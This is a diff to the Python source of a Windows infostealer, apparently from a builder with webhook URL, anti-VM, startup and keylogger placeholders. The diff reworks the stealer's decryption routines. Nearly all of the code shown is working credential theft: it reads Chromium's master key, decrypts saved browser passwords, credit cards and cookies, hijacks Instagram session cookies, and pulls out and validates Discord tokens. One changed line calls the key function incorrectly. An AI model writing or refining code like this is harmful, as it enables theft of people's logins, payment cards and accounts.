@@ -1,12 +1,13 @@
 import sqlite3, ctypes, sys, winreg
 import os, wmi, win32api, platform, psutil, time, GPUtil
 import shutil, pythoncom
-import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
-from Crypto.Cipher import AES
+import base64, json, threading, requests, dhooks, re, subprocess
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
-UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
-Anti_Vm = "%AnTiVm%"
+UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'
+Anti_Vm = "false"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
 injectKeylogger = "%keyloggerinject???%"
@@ -16,6 +17,63 @@ def create_mutex(mutex_value) -> bool:
     kernel32 = ctypes.windll.kernel32 #kernel32.dll 
     mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutext
     return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
+
+class SubModules:
+    @staticmethod
+    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll
+
+        class DATA_BLOB(ctypes.Structure):
+
+            _fields_ = [
+                ("cbData", ctypes.c_ulong),
+                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
+            ]
+        
+        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
+        pDataOut = DATA_BLOB()
+        pOptionalEntropy = None
+
+        if optional_entropy is not None:
+            optional_entropy = optional_entropy.encode("utf-16")
+            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
+
+        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
+            data = (ctypes.c_ubyte * pDataOut.cbData)()
+            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
+            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
+            return bytes(data)
+
+        raise ValueError("Invalid encrypted_data provided!")
+
+    @staticmethod
+    def GetKey(FilePath:str) -> bytes:
+        with open(FilePath,"r", encoding= "utf-8", errors= "ignore") as file:
+            jsonContent: dict = json.load(file)
+
+            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
+            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
+
+            return SubModules.CryptUnprotectData(encryptedKey)
+
+    @staticmethod
+    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
+        try:
+            version = EncrypedValue.decode(errors="ignore")
+            if version.startswith("v10") or version.startswith("v11"):
+                iv = EncrypedValue[3:15]
+                password = EncrypedValue[15:]
+                authentication_tag = password[-16:]  # Extract the last 16 bytes as the authentication tag
+                password = password[:-16]  # Remove the authentication tag from the password
+                backend = default_backend()
+                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
+                decryptor = cipher.decryptor()
+                decrypted_password = decryptor.update(password) + decryptor.finalize()
+                return decrypted_password.decode('utf-8')
+            else:
+                return str(SubModules.CryptUnprotectData(EncrypedValue))
+        except:
+            return "Decryption Error!, Data cant be decrypt"
+
 class GetMic:
     def __init__(self):
         self.winmm = ctypes.WinDLL('winmm.dll')
@@ -115,26 +173,7 @@ class QuicaxdExela:
                 self.connect_to_database3(path, f, "Local")
                 self.connect_to_database4(path, f, "Local")
                 self.connect_to_database5(path, f, "Local")
-    def get_encryption_key(self, value):
-        local_state_path = os.path.join(value, "Local State")
-        with open(local_state_path, "r", encoding="utf-8", errors="ignore") as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
 
-        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        key = key[5:]
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    def decrypt_pw(self, password, key):
-        try:
-            iv = password[3:15]
-            password = password[15:]
-            cipher = AES.new(key, AES.MODE_GCM, iv)
-            return cipher.decrypt(password)[:-16].decode()
-        except:
-            try:
-                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-            except:
-                return "None"
     def connect_to_database(self, value, value2, asd):
         try:
             path = f"{value}\\{value2}" + "\\Login Data"
@@ -161,13 +200,13 @@ class QuicaxdExela:
                 logins = cursor.fetchall()
                 conn.close()
                 os.remove(self.backup_login_data_path)
-                key = self.get_encryption_key(value)
+                key = SubModules.GetKey(os.path.join(value, "Local State"))
                 for login in logins:
                     if login[1] and login[2]:
                         self.passws +=1
                         url = login[0]
                         username = login[1]
-                        password = self.decrypt_pw(login[2], key)
+                        password = SubModules.Decrpytion(login[2], key)
                         self.passw.append("URL : " + url )
                         self.passw.append("Username : " + username )
                         self.passw.append("Password : " + password )
@@ -189,10 +228,6 @@ class QuicaxdExela:
                 return
             else:
                 #print(path)
-                try:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-                except:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                 self.login_data_path = path
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
@@ -202,14 +237,14 @@ class QuicaxdExela:
                 logins = cursor.fetchall()
                 conn.close()
                 os.remove(self.backup_login_data_path)
-                key = self.get_encryption_key(value)
+                key = SubModules.GetKey(os.path.join(value, "Local State"))(value)
                 for cc in logins:
                     if cc[0]:
                         self.cc +=1
                         if cc[2] < 10:
                             month = "0"  + f"{cc[2]}"
                         else:month = cc[2]
-                        self.ottomonCC.append(str(self.decrypt_pw(cc[0], key)) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
+                        self.ottomonCC.append(str(SubModules.Decrpytion(cc[0], key)) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
         except:
             pass
     def connect_to_database3(self, value, value2, asd):
@@ -247,11 +282,11 @@ class QuicaxdExela:
                 logins = cursor.fetchall()
                 conn.close()
                 os.remove(self.backup_login_data_path)
-                key = self.get_encryption_key(value)
+                key = SubModules.GetKey(os.path.join(value, "Local State"))
                 for cookie in logins:
                     if cookie[3]:
                         self.cookie += 1
-                        cooked = self.decrypt_pw(cookie[3],key)
+                        cooked = SubModules.Decrpytion(cookie[3],key)
                         self.cookeds.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cooked}")
                         if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                             self.setInstaSession(cooked, profil_kismi)
@@ -630,10 +665,10 @@ class QuicaxdExela:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for q in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
-                                if self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")) in self.dcToken:
+                                if SubModules.Decrpytion(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), SubModules.GetKey(os.getenv("appdata") + f"\\Discord\\Local State")) in self.dcToken:
                                     continue
                                 else:
-                                    self.validateDcTokenAndGetInfo(self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")))
+                                    self.validateDcTokenAndGetInfo(SubModules.Decrpytion(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), SubModules.GetKey(os.getenv("appdata") + f"\\Discord\\Local State")))
         except Exception as e:
             print(str(e))
     def validateDcTokenAndGetInfo(self, value):
